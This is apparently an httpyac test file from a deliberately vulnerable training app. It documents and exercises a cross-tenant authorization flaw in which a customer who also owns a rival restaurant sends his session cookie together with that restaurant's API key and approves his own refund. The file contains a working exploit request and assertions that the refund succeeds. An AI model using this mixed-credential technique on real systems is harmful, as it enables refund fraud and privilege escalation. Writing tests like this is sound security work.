# @import ../_imports.http
# @import ../../refund/post/happy.http

# =============================================================================
# VULNERABILITY: R03 Dual-Auth Refund Approval (CVE-like: authorization confusion)
# =============================================================================
#
# DESCRIPTION:
#   has_access_to_order() returns True if EITHER the customer session owns the
#   order OR the restaurant API key matches the order's restaurant. When both
#   auth methods are present, the check succeeds if EITHER passes - allowing
#   cross-tenant privilege escalation.
#
# ATTACK SCENARIO:
#   Plankton (customer + Chum Bucket owner):
#   1. Places order at Krusty Krab (keeps customer session cookie)
#   2. Requests refund for his order (creates pending refund)
#   3. Approves his own refund using Chum Bucket manager API key
#      â†’ The helper approves because his cookie owns the order!
#
# IMPACT:
#   Cross-tenant privilege escalation. Customers who also own restaurants
#   can approve their own refunds at competitor restaurants.
#
# STATUS: VULNERABLE in v301 (exploit succeeds)
#         When fixed, this test should be overridden to expect failure.
#
# INHERITANCE:
#   - v302+: Override with vuln-dual-auth-refund.http that expects isError()
#   - Or: Tag with @tag v301-vulnerable and exclude in fixed versions
# =============================================================================

# =============================================================================
# EXPLOIT: Customer approves own refund with unrelated restaurant API key
# =============================================================================

### Plankton uses Chum Bucket API key while his customer cookie is present
# The authorization check passes because his cookie owns the order,
# even though Chum Bucket has no authority over Krusty Krab orders.
# @name approve_refund
# @forceRef large_refund_pending
{{
  const cookie = await auth.login("plankton");
  exports.planktonCookie = cookie;
  // Capture balance before exploit (assertions run AFTER request!)
  exports.balanceBefore = await user("plankton").balance();
}}
# @tag orders, r03, v301, vulnerable
PATCH /orders/{{order_id}}/refund/status
Cookie: {{planktonCookie}}
X-API-Key: {{auth.restaurant("chum_bucket")}}
Content-Type: application/x-www-form-urlencoded

status=approved

# VULNERABLE: Exploit succeeds - refund approved by wrong restaurant
?? js $(response).isOk() == true
?? js $(response).field("status") == approved
# IMPACT: Plankton received full refund (balance increased by order_total)
?? js await user("plankton").balance() == {{balanceBefore + order_total}}
